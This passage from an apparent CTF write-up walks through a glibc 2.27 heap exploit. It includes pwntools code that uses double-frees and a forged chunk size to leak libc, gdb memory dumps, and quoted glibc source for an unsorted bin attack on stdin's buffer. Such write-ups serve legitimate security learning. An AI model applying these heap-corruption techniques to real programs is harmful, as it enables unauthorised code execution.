class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allochuge</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;How much space do you need for this massive weapon: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get libc leak</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">56</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">55</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">56</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">39</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">40</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">39</span>) <span class="comment"># size</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">56</span>, <span class="string">b&quot;D&quot;</span>*(<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">40</span>, <span class="string">b&quot;E&quot;</span>*<span class="number">39</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">40</span>, pwn.p64(<span class="number">0</span>) + pwn.p64(<span class="number">0x21</span>)) <span class="comment"># barrier</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># freexalloc(5, 560, b&quot;&quot;, doubleFree=True)</span></span><br><span class="line"></span><br><span class="line">freexalloc(<span class="number">1</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">freexalloc(<span class="number">0</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">freexalloc(<span class="number">2</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">freexalloc(<span class="number">1</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">56</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">56</span>  + <span class="string">b&quot;\xb1&quot;</span>) <span class="comment"># fake unsorted chunk</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x555555608560:	0x0000000000000000	0x0000000000000041 [0]</span></span><br><span class="line"><span class="string">0x555555608570:	0x00005555556085a0	0x4141414141414141</span></span><br><span class="line"><span class="string">0x555555608580:	0x4141414141414141	0x4141414141414141</span></span><br><span class="line"><span class="string">0x555555608590:	0x4141414141414141	0x4141414141414141</span></span><br><span class="line"><span class="string">0x5555556085a0:	0x0a41414141414141	0x0000000000000041 [1]</span></span><br><span class="line"><span class="string">0x5555556085b0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x5555556085c0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x5555556085d0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x5555556085e0:	0x0000000000000000	0x00000000000000b1 [2] &lt;- Fake size | PREV_INUSE (1)</span></span><br><span class="line"><span class="string">0x5555556085f0:	0x0000000000000000	0x4343434343434343	 </span></span><br><span class="line"><span class="string">0x555555608600:	0x4343434343434343	0x4343434343434343	 </span></span><br><span class="line"><span class="string">0x555555608610:	0x0a43434343434343	0x0000000000000041 [3]	 </span></span><br><span class="line"><span class="string">0x555555608620:	0x4444444444444444	0x4444444444444444	 </span></span><br><span class="line"><span class="string">0x555555608630:	0x000000000000000a	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555608640:	0x0000000000000000	0x0000000000000000	 </span></span><br><span class="line"><span class="string">0x555555608650:	0x0000000000000000	0x0000000000000031 [4]	 </span></span><br><span class="line"><span class="string">0x555555608660:	0x4545454545454545	0x4545454545454545	 </span></span><br><span class="line"><span class="string">0x555555608670:	0x4545454545454545	0x4545454545454545	 </span></span><br><span class="line"><span class="string">0x555555608680:	0x0a45454545454545	0x0000000000000031 [10]	 </span></span><br><span class="line"><span class="string">0x555555608690:	0x0000000000000000	0x0000000000000021 &lt;- Fake chunk header </span></span><br><span class="line"><span class="string">0x5555556086a0:	0x000000000000000a	0x0000000000000000</span></span><br><span class="line"><span class="string">0x5555556086b0:	0x0000000000000000	0x0000000000020951 &lt;- Top chunk</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fastbins</span></span><br><span class="line"><span class="string">0x30: 0x5555556085e0 ◂— 0x0</span></span><br><span class="line"><span class="string">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on <code>chunk_2</code> (<code>&amp;chunk_2</code> + <code>0xb0</code> &#x3D; <code>0x555555608690</code>, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of <code>chunk_2</code>. If you’re not familiar with the security checks done by <code>malloc</code> and <code>free</code>, I would advise you to take a look at <a target="_blank" rel="noopener" href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks">this resource</a>.</p>
<p>Now that <code>chunk_2</code> has been tampered with a fake <code>0xb0</code> size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">freexalloc(<span class="number">2</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">freexalloc(<span class="number">2</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">freexalloc(<span class="number">2</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">freexalloc(<span class="number">2</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">freexalloc(<span class="number">2</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">freexalloc(<span class="number">2</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">freexalloc(<span class="number">2</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">freexalloc(<span class="number">2</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># falls into the unsortedbin</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc = pwn.u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span> <span class="comment"># offset of the unsorted bin</span></span><br><span class="line"></span><br><span class="line">stdin = libc + <span class="number">0x3eba00</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x555555608560:	0x0000000000000000	0x0000000000000041</span></span><br><span class="line"><span class="string">0x555555608570:	0x00005555556085a0	0x4141414141414141</span></span><br><span class="line"><span class="string">0x555555608580:	0x4141414141414141	0x4141414141414141</span></span><br><span class="line"><span class="string">0x555555608590:	0x4141414141414141	0x4141414141414141</span></span><br><span class="line"><span class="string">0x5555556085a0:	0x0a41414141414141	0x0000000000000041</span></span><br><span class="line"><span class="string">0x5555556085b0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x5555556085c0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x5555556085d0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x5555556085e0:	0x0000000000000000	0x00000000000000b1</span></span><br><span class="line"><span class="string">0x5555556085f0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0</span></span><br><span class="line"><span class="string">0x555555608600:	0x4343434343434343	0x4343434343434343</span></span><br><span class="line"><span class="string">0x555555608610:	0x0a43434343434343	0x0000000000000041</span></span><br><span class="line"><span class="string">0x555555608620:	0x4444444444444444	0x4444444444444444</span></span><br><span class="line"><span class="string">0x555555608630:	0x000000000000000a	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555608640:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="string">0x555555608650:	0x0000000000000000	0x0000000000000031</span></span><br><span class="line"><span class="string">0x555555608660:	0x4545454545454545	0x4545454545454545</span></span><br><span class="line"><span class="string">0x555555608670:	0x4545454545454545	0x4545454545454545</span></span><br><span class="line"><span class="string">0x555555608680:	0x0a45454545454545	0x0000000000000031</span></span><br><span class="line"><span class="string">0x555555608690:	0x00000000000000b0	0x0000000000000020</span></span><br><span class="line"><span class="string">0x5555556086a0:	0x000000000000000a	0x0000000000000000</span></span><br><span class="line"><span class="string">0x5555556086b0:	0x0000000000000000	0x0000000000020951</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">unsortedbin</span></span><br><span class="line"><span class="string">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0</span></span><br><span class="line"><span class="string">tcachebins</span></span><br><span class="line"><span class="string">0xb0 [  7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>Which gives:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR</span><br><span class="line">[*] &#x27;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/out&#x27;</span><br><span class="line">[!] Debugging process with ASLR disabled</span><br><span class="line">[+] Starting local process &#x27;/usr/bin/gdbserver&#x27;: pid 31378</span><br><span class="line">[*] running in new terminal: [&#x27;/usr/bin/gdb&#x27;, &#x27;-q&#x27;, &#x27;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&#x27;, &#x27;-x&#x27;, &#x27;/tmp/pwn1z_5e0ie.gdb&#x27;]</span><br><span class="line">[*] libc: 0x7ffff79e4000</span><br></pre></td></tr></table></figure>

<p>We now have achieved the first step of the challenge: leak the libc base address.</p>
<h2 id="What-can-we-target-in-the-libc"><a href="#What-can-we-target-in-the-libc" class="headerlink" title="What can we target in the libc ?"></a>What can we target in the libc ?</h2><p>There are a lot of ways to achieve code execution according to what I red in other write-ups, I choose to attack <code>_IO_stdin</code> by running an unsorted bin attack on its <code>_IO_buf_end</code> field which holds the end of the internal buffer of <code>stdin</code> from <code>_IO_buf_base</code>, according to the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/fileops.c#L469">glibc source code</a>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The interesting part is the <code>count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code> which reads <code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code> bytes in <code>fp-&gt;_IO_buf_base</code>. Which means if <code>fp-&gt;_IO_buf_end</code> is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that <code>&amp;unsorted bin &gt; fp-&gt;_IO_buf_base</code>, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what’s actually going on:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/100gx stdin</span><br><span class="line">0x7ffff7dcfa00 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007ffff7dcfa83</span><br><span class="line">0x7ffff7dcfa10 &lt;_IO_2_1_stdin_+16&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83</span><br><span class="line">0x7ffff7dcfa20 &lt;_IO_2_1_stdin_+32&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83</span><br><span class="line">0x7ffff7dcfa30 &lt;_IO_2_1_stdin_+48&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83</span><br><span class="line">0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfa84	0x0000000000000000</span><br><span class="line">0x7ffff7dcfa50 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfa60 &lt;_IO_2_1_stdin_+96&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfa70 &lt;_IO_2_1_stdin_+112&gt;:	0x0000001000000000	0xffffffffffffffff</span><br><span class="line">0x7ffff7dcfa80 &lt;_IO_2_1_stdin_+128&gt;:	0x000000000a000000	0x00007ffff7dd18d0</span><br><span class="line">0x7ffff7dcfa90 &lt;_IO_2_1_stdin_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x7ffff7dcfaa0 &lt;_IO_2_1_stdin_+160&gt;:	0x00007ffff7dcfae0	0x0000000000000000</span><br><span class="line">0x7ffff7dcfab0 &lt;_IO_2_1_stdin_+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfac0 &lt;_IO_2_1_stdin_+192&gt;:	0x00000000ffffffff	0x0000000000000000</span><br><span class="line">0x7ffff7dcfad0 &lt;_IO_2_1_stdin_+208&gt;:	0x0000000000000000	0x00007ffff7dcc2a0</span><br><span class="line">0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfaf0 &lt;_IO_wide_data_0+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb00 &lt;_IO_wide_data_0+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb10 &lt;_IO_wide_data_0+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb20 &lt;_IO_wide_data_0+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb30 &lt;_IO_wide_data_0+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb40 &lt;_IO_wide_data_0+96&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb50 &lt;_IO_wide_data_0+112&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb60 &lt;_IO_wide_data_0+128&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb70 &lt;_IO_wide_data_0+144&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb80 &lt;_IO_wide_data_0+160&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfb90 &lt;_IO_wide_data_0+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfba0 &lt;_IO_wide_data_0+192&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfbb0 &lt;_IO_wide_data_0+208&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfbc0 &lt;_IO_wide_data_0+224&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfbd0 &lt;_IO_wide_data_0+240&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfbe0 &lt;_IO_wide_data_0+256&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfbf0 &lt;_IO_wide_data_0+272&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfc00 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfc10 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dcbd60	0x0000000000000000</span><br><span class="line">0x7ffff7dcfc20 &lt;__memalign_hook&gt;:	0x00007ffff7a7b410	0x00007ffff7a7c790</span><br><span class="line">0x7ffff7dcfc30 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfc40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x7ffff7dcfc50 &lt;main_arena+16&gt;:	0x0000000000000000	0x00005555556085e0</span><br><span class="line">0x7ffff7dcfc60 &lt;main_arena+32&gt;:	0x0000555555608560	0x0000000000000000</span><br><span class="line">0x7ffff7dcfc70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfc80 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfc90 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0	&lt;- &amp;unsortedbin = 0x7ffff7dcfca0</span><br><span class="line">pwndbg&gt; p *stdin</span><br><span class="line">$1 = &#123;</span><br><span class="line">  _flags = -72540021,</span><br><span class="line">  _IO_read_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_read_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x0,</span><br><span class="line">  _fileno = 0,</span><br><span 